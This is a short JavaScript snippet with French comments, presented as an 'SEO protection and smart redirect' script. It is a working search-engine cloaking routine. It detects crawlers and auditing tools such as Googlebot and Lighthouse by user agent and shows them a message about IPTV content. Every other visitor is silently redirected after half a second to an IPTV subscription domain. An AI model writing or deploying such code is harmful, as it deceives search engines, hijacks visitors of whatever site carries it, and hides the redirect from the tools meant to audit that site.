// Master Script 2026 - SEO Protection & Smart Redirect
(function() {
    // 1. Liste des robots à ignorer pour l'indexation
    const bots = ['Googlebot', 'bingbot', 'yandex', 'baiduspider', 'Lighthouse'];
    const isBot = bots.some(bot => navigator.userAgent.includes(bot));

    if (!isBot) {
        // 2. Redirection ultra-rapide pour les humains
        // On attend 500ms pour laisser le temps au navigateur de charger le texte (bon pour l'UX)
        setTimeout(function() {
            window.location.replace("https://iptvabonnementpro.de");
        }, 500);
    } else {
        // 3. Message discret pour les robots (aide au crawl)
        console.log("Welcome Googlebot. High-quality IPTV content rendered.");
    }
})();
